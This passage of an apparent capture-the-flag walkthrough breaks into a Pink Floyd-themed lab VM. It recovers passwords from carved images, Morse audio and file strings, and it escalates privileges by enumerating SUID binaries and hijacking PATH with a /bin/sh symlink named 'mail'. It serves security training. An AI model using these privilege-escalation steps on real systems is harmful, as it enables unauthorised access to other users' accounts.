</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# sftp -P <span class="m">1965</span> SydBarrett@10.1.1.148
</span><span class='line'>SydBarrett@10.1.1.148<span class="err">&#39;</span>s password:
</span><span class='line'>Connected to 10.1.1.148.
</span><span class='line'>sftp&gt; ls -ahl
</span><span class='line'>drwxr-x---    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 .
</span><span class='line'>drwxr-x---    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 ..
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail
</span><span class='line'>-rw-r--r--    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         1.9K Oct <span class="m">25</span> 18:56 bio.txt
</span><span class='line'>-rw-r--r--    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         849K Oct <span class="m">24</span> 12:17 syd_barrett_profile_pic.jpg
</span><span class='line'>sftp&gt; ls -alh .mail
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail/.
</span><span class='line'>drwxr-x---    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 .mail/..
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Nov <span class="m">11</span> 05:25 .mail/.stash
</span><span class='line'>-rw-r--r--    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         309B Oct <span class="m">24</span> 14:18 .mail/sent-items
</span><span class='line'>sftp&gt; ls -alh .mail/.stash
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Nov <span class="m">11</span> 05:25 .mail/.stash/.
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail/.stash/..
</span><span class='line'>-rw-r--r--    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>        46.6M Aug  <span class="m">7</span> 10:33 .mail/.stash/eclipsed_by_the_moon
</span><span class='line'>sftp&gt;
</span><span class='line'>sftp&gt; get bio.txt
</span><span class='line'>Fetching /bio.txt to bio.txt
</span><span class='line'>/bio.txt                                                                                                                                                                   100% <span class="m">1912</span>     1.9KB/s   00:00
</span><span class='line'>sftp&gt; get syd_barrett_profile_pic.jpg
</span><span class='line'>Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
</span><span class='line'>/syd_barrett_profile_pic.jpg                                                                                                                                               100%  849KB 848.6KB/s   00:01
</span><span class='line'>sftp&gt; get .mail/sent-items
</span><span class='line'>Fetching /.mail/sent-items to sent-items
</span><span class='line'>/.mail/sent-items                                                                                                                                                          100%  <span class="m">309</span>     0.3KB/s   00:00
</span><span class='line'>sftp&gt; get .mail/.stash/eclipsed_by_the_moon
</span><span class='line'>Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
</span><span class='line'>/.mail/.stash/eclipsed_by_the_moon                                                                                                                                         100%   47MB   7.8MB/s   00:06
</span><span class='line'>sftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Good, let&rsquo;s check the files one by one.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# file eclipsed_by_the_moon
</span><span class='line'>eclipsed_by_the_moon: gzip compressed data, last modified: Tue Nov <span class="m">10</span> 19:15:47 2015, from Unix
</span><span class='line'>root@kali:~/the_wall# tar zxvf eclipsed_by_the_moon
</span><span class='line'>eclipsed_by_the_moon.lsd
</span><span class='line'>root@kali:~/the_wall# file eclipsed_by_the_moon.lsd
</span><span class='line'>eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors <span class="m">96256</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , serial number 0x9e322180, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is nothing interesting in the frist three files but the last one <code>eclipsed_by_the_moon</code> which the size is 46.6M and it is a <code>gz</code> archive file.</p>

<p>After unzip the file, we got a FAT format system here. Then I use <code>foremost</code> to check and extract interesting files.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# foremost -v -i eclipsed_by_the_moon.lsd
</span><span class='line'>Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
</span><span class='line'>Audit File
</span><span class='line'>
</span><span class='line'>Foremost started at Sun Dec  <span class="m">6</span> 00:57:34 2015
</span><span class='line'>Invocation: foremost -v -i eclipsed_by_the_moon.lsd
</span><span class='line'>Output directory: /root/the_wall/output
</span><span class='line'>Configuration file: /etc/foremost.conf
</span><span class='line'>Processing: eclipsed_by_the_moon.lsd
</span><span class='line'><span class="p">|</span>------------------------------------------------------------------
</span><span class='line'>File: eclipsed_by_the_moon.lsd
</span><span class='line'>Start: Sun Dec  <span class="m">6</span> 00:57:34 2015
</span><span class='line'>Length: <span class="m">47</span> MB <span class="o">(</span><span class="m">49283072</span> bytes<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Num    Name <span class="o">(</span><span class="nv">bs</span><span class="o">=</span>512<span class="o">)</span>        Size  File Offset     Comment
</span><span class='line'>
</span><span class='line'>0:    00000418.jpg         <span class="m">123</span> KB       <span class="m">214016</span>  
</span><span class='line'>*<span class="p">|</span>
</span><span class='line'>Finish: Sun Dec  <span class="m">6</span> 00:57:35 2015
</span><span class='line'>
</span><span class='line'><span class="m">1</span> FILES EXTRACTED
</span><span class='line'>  
</span><span class='line'>jpg:<span class="o">=</span> 1
</span><span class='line'>------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>Foremost finished at Sun Dec  <span class="m">6</span> 00:57:35 2015
</span></code></pre></td></tr></table></div></figure>


<p>Here we got a JPG file extracted. Open it and this is Roger Waters! also his password: <font color='red'><code>hello_is_there_anybody_in_there</code></font></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/the_wall/00000418.jpg"></p>

<p>From the previous username <code>SydBarrett</code>, we guess Roger&rsquo;s username format should be the same, <code>RogerWaters</code></p>

<p>With this username and password, we can finally get a non privileged SSH shell from the target server&rsquo;s port <code>1965</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# ssh RogerWaters@10.1.1.148 -p 1965
</span><span class='line'>RogerWaters@10.1.1.148<span class="s1">&#39;s password: </span>
</span><span class='line'><span class="s1">OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015</span>
</span><span class='line'>
</span><span class='line'><span class="s1">                       .u!&quot;`</span>
</span><span class='line'><span class="s1">                   .x*&quot;`</span>
</span><span class='line'><span class="s1">               ..+&quot;NP</span>
</span><span class='line'><span class="s1">            .z&quot;&quot;   ?</span>
</span><span class='line'><span class="s1">          M#`      9     ,     ,</span>
</span><span class='line'><span class="s1">                   9 M  d! ,8P&#39;</span>
</span><span class='line'>                   R X.:x<span class="s1">&#39; R&#39;</span>  ,
</span><span class='line'>                   F F<span class="s1">&#39; M  R.d&#39;</span>
</span><span class='line'>                   d P  @  E<span class="sb">`</span>  ,
</span><span class='line'>      ss           P  <span class="s1">&#39;  P  N.d&#39;</span>
</span><span class='line'>       x         <span class="s1">&#39;&#39;</span>        <span class="s1">&#39;</span>
</span><span class='line'><span class="s1">       X               x             .</span>
</span><span class='line'><span class="s1">       9     .f       !         .    $b</span>
</span><span class='line'><span class="s1">       4;    $k      /         dH    $f</span>
</span><span class='line'><span class="s1">       &#39;</span>X   <span class="p">;</span><span class="nv">$$</span>     z  .       MR   :<span class="err">$</span>
</span><span class='line'>        R   M<span class="nv">$$</span>,   :  d9b      M<span class="s1">&#39;   tM</span>
</span><span class='line'><span class="s1">        M:  #&#39;</span><span class="nv">$L</span>  <span class="p">;</span><span class="s1">&#39; M `8      X    MR</span>
</span><span class='line'><span class="s1">        `$;t&#39;</span> <span class="nv">$F</span>  <span class="c"># X ,oR      t    Q;</span>
</span><span class='line'>         <span class="nv">$$</span>@  R<span class="nv">$ </span>H :RP<span class="s1">&#39; $b     X    @&#39;</span>
</span><span class='line'>         9<span class="nv">$E</span>  @Bd<span class="s1">&#39; $&#39;</span>   ?X     <span class="p">;</span>    W
</span><span class='line'>         <span class="sb">`</span>M<span class="s1">&#39;  `$M d$    `E    ;.o* :R   ..</span>
</span><span class='line'><span class="s1">          `    &#39;</span>  <span class="s2">&quot;&#39;     &#39;    @&#39;   &#39;$o*&quot;</span><span class="err">&#39;</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/RogerWaters
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we are in, next step should be go upper to escape privilege.</p>

<p>After enumeration the file system, I found the following information.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -al /home
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x   <span class="m">7</span> root           wheel          <span class="m">512</span> Oct <span class="m">24</span> 17:36 .
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root           wheel          <span class="m">512</span> Oct <span class="m">24</span> 18:03 ..
</span><span class='line'>drwx------   <span class="m">4</span> DavidGilmour   DavidGilmour   <span class="m">512</span> Oct <span class="m">28</span> 09:28 DavidGilmour
</span><span class='line'>drwx------   <span class="m">3</span> NickMason      NickMason      <span class="m">512</span> Aug  <span class="m">8</span> 00:33 NickMason
</span><span class='line'>drwx------   <span class="m">3</span> RichardWright  RichardWright  <span class="m">512</span> Nov <span class="m">27</span> 02:02 RichardWright
</span><span class='line'>drwx------   <span class="m">3</span> RogerWaters    RogerWaters    <span class="m">512</span> Oct <span class="m">28</span> 09:29 RogerWaters
</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root           SydBarrett     <span class="m">512</span> Oct <span class="m">24</span> 18:03 SydBarrett
</span></code></pre></td></tr></table></div></figure>


<p>Looks like there are 5 users in the system and we have already got 2, so more like we need to escape to others before get ROOT.</p>

<p>Then we try to find files which set the sticky bit under those three users, and we found:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>find / -perm -u<span class="o">=</span>s -type f -user DavidGilmour 2&gt;/dev/null
</span><span class='line'>/usr/local/bin/shineon
</span><span class='line'><span class="nv">$ </span>find / -perm -g<span class="o">=</span>s -type f -user NickMason 2&gt;/dev/null
</span><span class='line'>/usr/local/bin/brick
</span><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/shineon
</span><span class='line'>-rwsr-s---  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon
</span><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/brick
</span><span class='line'>-rws--s--x  <span class="m">1</span> NickMason  NickMason  <span class="m">7291</span> Aug  <span class="m">8</span> 00:33 /usr/local/bin/brick
</span></code></pre></td></tr></table></div></figure>


<p>Cool!! Any one can run the file <font color="red"><code>/usr/local/bin/brick</code></font> and it has sticky bit set!</p>

<p>Run it and give the correct answer (which should not be a problem if you familiar with Pink Floyd), so I am now Nick Mason!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/usr/local/bin/brick
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>What have we here, laddie?
</span><span class='line'>Mysterious scribbings?
</span><span class='line'>A secret code?
</span><span class='line'>Oh, poems, no less!
</span><span class='line'>Poems everybody!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
</span><span class='line'>/bin/sh: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>NickMason
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>By checking NickMason&rsquo;s home folder, nothing interesting but another jpg file, I downloaded it to my Kali and try to open it but it is not a JPEG file&hellip; it is an Ogg audio file!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# display nick_mason_profile_pic.jpg
</span><span class='line'>display: Not a JPEG file: starts with 0x4f 0x67 <span class="sb">`</span>nick_mason_profile_pic.jpg<span class="err">&#39;</span> @ error/jpeg.c/JPEGErrorHandler/322.
</span><span class='line'>root@kali:~/the_wall# file nick_mason_profile_pic.jpg
</span><span class='line'>nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, <span class="m">44100</span> Hz, ~160000 bps, created by: Xiph.Org libVorbis I
</span><span class='line'>root@kali:~/the_wall#
</span></code></pre></td></tr></table></div></figure>


<p>Open and listen it carefully, there is moss code playing in the background. after run some audio analyze tools to curve the morse code out (more details please check <a href="https://highon.coffee/blog/the-wall-walkthrough/" title="Arr0way's walkthrough">Arr0way&rsquo;s walkthrough</a>):</p>

<p><font size='2'><strong><code>.-. .. -.-. .... .- .-. -.. .-- .-. .. --. .... - .---- ----. ....- ...-- ..-. .- .-. ..-. .. ... .-</code></strong></font></p>

<p>Crack the morse code <a href="http://morsecode.scphillips.com/translator.html/" title="Morse Code Translator">online</a> and we got the plaintext which is <code>RICHARDWRIGHT1943FARFISA</code>. So now we got a new login credential: username is <code>RichardWright</code> and password is <font color="red"><code>1943farfisa</code></font>.</p>

<p>Right, now I can <code>su</code> to Richard successfully!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su RichardWright
</span><span class='line'>Password:
</span><span class='line'>ksh: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>RichardWright
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s back to the other sticky file <code>/usr/local/bin/shineon</code> which is can be run by <code>RichardWright</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/shineon
</span><span class='line'>-rwsr-s---  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon
</span></code></pre></td></tr></table></div></figure>


<p>After run the program, we know that it call system commands such as <code>ping</code> and <code>mail</code> etc&hellip; Let&rsquo;s check if there is basic coding error we can exploit to priv escape.</p>

<p>Run <code>strings</code> to check the binary file and found it call the command <code>mail</code> without specifying the absolute path.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Menu
</span><span class='line'>1. Calendar
</span><span class='line'>2. Who
</span><span class='line'>3. Check Internet
</span><span class='line'>4. Check Mail
</span><span class='line'>5. Exit
</span><span class='line'>Quitting program!
</span><span class='line'>Invalid choice!
</span><span class='line'>load_menu
</span><span class='line'>Time - The Dark Side of the Moon
</span><span class='line'>/usr/bin/cal
</span><span class='line'>Press ENTER to <span class="k">continue</span>.
</span><span class='line'>Echoes - Meddle
</span><span class='line'>/usr/bin/who
</span><span class='line'>Is There Anybody Out There? - The Wall
</span><span class='line'>/sbin/ping -c <span class="m">3</span> www.google.com
</span><span class='line'>Keep Talking- The Division Bell
</span><span class='line'>mail
</span></code></pre></td></tr></table></div></figure>


<p>Now, It&rsquo;s time to move to David!</p>

<p>First, create a symbolic link of <code>/bin/sh</code> to the global writable directory <code>/tmp</code> and name it as <code>mail</code>, then overriding the environment variable <code>$PATH</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ln -s /bin/sh /tmp/mail
</span><span class='line'><span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then run <code>/usr/local/bin/shineon</code> and choose number <code>4</code> to call our fake <code>mail</code>, then we got a shell with <code>DavidGilmour</code> priviledge.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/usr/local/bin/shineon
</span><span class='line'>Menu
</span><span class='line'>
</span><span class='line'>1. Calendar
</span><span class='line'>2. Who
</span><span class='line'>3. Check Internet
</span><span class='line'>4. Check Mail
</span><span class='line'>5. Exit
</span><span class='line'>4
</span><span class='line'>Keep Talking- The Division Bell
</span><span class='line'>mail: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>mail: <span class="nb">pwd</span>: can<span class="err">&#39;</span>t get current directory - Permission denied
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>DavidGilmour
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /home/DavidGilmour
</span><span class='line'><span class="nv">$ </span>ls -alh
</span><span class='line'>total 408
</span><span class='line'>drwx------  <span class="m">4</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">28</span> 09:28 .
</span><span class='line'>drwxr-xr-x  <span class="m">7</span> root          wheel          512B Oct <span class="m">24</span> 17:36 ..
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour    87B Oct <span class="m">24</span> 17:36 .Xdefaults
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   773B Oct <span class="m">24</span> 17:36 .cshrc
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   103B Oct <span class="m">24</span> 17:36 .cvsrc
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   398B Oct <span class="m">24</span> 17:36 .login
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   175B Oct <span class="m">24</span> 17:36 .mailrc
</span><span class='line'>drwx------  <span class="m">2</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">26</span> 11:44 .private
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   218B Oct <span class="m">24</span> 17:36 .profile
</span><span class='line'>drwx------  <span class="m">2</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">28</span> 05:16 .ssh
</span><span class='line'>-rw-------  <span class="m">1</span> DavidGilmour  DavidGilmour   384B Aug  <span class="m">8</span> 00:33 anotherbrick.txt
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour  1022B Oct <span class="m">26</span> 08:59 bio.txt
</span><span class='line'>-rwxr-----  <span class="m">1</span> DavidGilmour  DavidGilmour   178K Oct <span class="m">28</span> 08:50 david_gilmour_profile_pic.jpg
</span><span class='line'>-rw-r--r--  <span class="m">1</span> DavidGilmour  DavidGilmour   785B Oct <span class="m">27</span> 01:43 mbox
</span></code></pre></td></tr></table></div></figure>


<p>In order to get full priviledge of use <code>DavidGilmour</code>, I did some enumeration and there is a jpg file in David&rsquo;s home directory. By checking the jpg file <code>david_gilmour_profile_pic.jpg</code> with <code>strings</code>, I found the password on the bottom: <font color="red"><code>who_are_you_and_who_am_i</code></font>.</p>

<p>Now, login to David with his password.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>login: DavidGilmour
</span><span class='line'>Password:
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>DavidGilmour
</span></code></pre></td></tr></table></div></figure>


<p>After some enumeration, I found new clues in the file <code>anotherbrick.txt</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat anotherbrick.txt
</span><span class='line'><span class="c"># Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond</span>
</span><span class='line'>
</span><span class='line'>New website <span class="k">for</span> review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php
</span><span class='line'>
</span><span class='line'><span class="c"># You have to be trusted by the people you lie to. So that when they turn their backs on you, you&#39;ll get the chance to put the knife in. - Pink Floyd, Dogs </span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Checking the new web page, this is the home page of 50 years of Pink Floyd.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/the_wall/2.png"></p>

<p>After some testing with the new web page, could not find any attacking point, so I downloaded the picture and have a close look.</p>

<p>There are something hidden in it, by increasing the brightness of the picture, the hidden strings become more and more clearly.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/the_wall/homepageimg_x.jpg"></p>

<p>From the picture, we got a folder or a path <code>/welcometothemachine</code> and a key <code>50696e6b466c6f796435305965617273</code>.</p>

<p>By searching the keyword <code>welcometothemachine</code>, I found a sticky file which is owned by root!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>find / -name <span class="s1">&#39;welcometothemachine&#39;</span> 2&gt;/dev/null
</span><span class='line'>/var/www/htdocs/welcometothemachine
</span><span class='line'><span class="nv">$ </span>ls -al /var/www/htdocs/welcometothemachine
</span><span class='line'>total 24
